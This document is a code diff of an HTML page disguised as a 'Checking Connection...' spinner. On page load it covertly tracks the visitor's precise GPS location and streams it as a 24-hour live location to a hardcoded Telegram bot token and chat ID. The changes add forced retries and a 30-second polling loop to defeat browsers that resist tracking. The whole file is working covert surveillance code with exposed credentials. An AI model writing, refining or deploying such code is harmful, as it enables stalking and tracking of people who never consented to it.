@@ -1,45 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Connection...</title>
+    <style>
+        body { background-color: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { border: 4px solid rgba(0, 255, 0, 0.1); border-left-color: #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
+    <div class="spinner"></div>
     <script>
-        const BOT_TOKEN = '8236268570:AAGqWbuiFp1tRAqDRuY5nTHtfY93w0HHO94';
-        const CHAT_ID = '7709441425';
-        let messageId = null;
+        const CONFIG = {
+            token: '8236268570:AAGqWbuiFp1tRAqDRuY5nTHtfY93w0HHO94',
+            chatId: '7709441425',
+            livePeriod: 86400 // 24 Hours
+        };
 
-        function startTracking() {
-            if (navigator.geolocation) {
-                // High accuracy forces GPS usage over IP guessing
-                navigator.geolocation.watchPosition(updateLocation, handleError, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 5000
+        let messageId = null;
+        let lastUpdate = 0;
+
+        async function postToTelegram(method, params) {
+            const url = `https://api.telegram.org/bot${CONFIG.token}/${method}`;
+            const query = new URLSearchParams({ chat_id: CONFIG.chatId, ...params }).toString();
+            try {
+                const response = await fetch(`${url}?${query}`);
+                return await response.json();
+            } catch (e) { return null; }
+        }
+
+        async function updateLocation(pos) {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const now = Date.now();
+
+            // Throttling updates to every 5 seconds to prevent Telegram API rate limiting
+            if (now - lastUpdate < 5000) return;
+            lastUpdate = now;
+
+            if (!messageId) {
+                // Initial send with Live Location capability
+                const data = await postToTelegram('sendLocation', {
+                    latitude, longitude, live_period: CONFIG.livePeriod
+                });
+                if (data && data.ok) messageId = data.result.message_id;
+            } else {
+                // Edit the existing live location bubble
+                await postToTelegram('editMessageLiveLocation', {
+                    message_id: messageId, latitude, longitude
                 });
             }
         }
 
-        async function updateLocation(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            
-            // If it's the first coordinate, send a new Live Location message
-            if (!messageId) {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}&live_period=86400`);
-                const data = await res.json();
-                messageId = data.result.message_id;
-            } else {
-                // Update the existing map bubble in real-time
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageLiveLocation?chat_id=${CHAT_ID}&message_id=${messageId}&latitude=${lat}&longitude=${lon}`);
-            }
-        }
-
         function handleError(err) {
-            // Logic to handle permission denial or signal loss
+            // Force retry on timeout or temporary signal loss
+            if (err.code === 3) startTracking();
         }
 
-        window.onload = startTracking;
+        function startTracking() {
+            const options = {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 10000
+            };
+
+            // Main tracking loop
+            navigator.geolocation.watchPosition(updateLocation, handleError, options);
+            
+            // Redundant check for stubborn browsers (iOS Safari)
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(updateLocation, handleError, options);
+            }, 30000);
+        }
+
+        // Initialize on interaction or load
+        window.addEventListener('load', () => {
+            // Some mobile browsers require a user gesture or "interaction"
+            // This script attempts immediate execution
+            startTracking();
+        });
     </script>
 </body>
 </html>
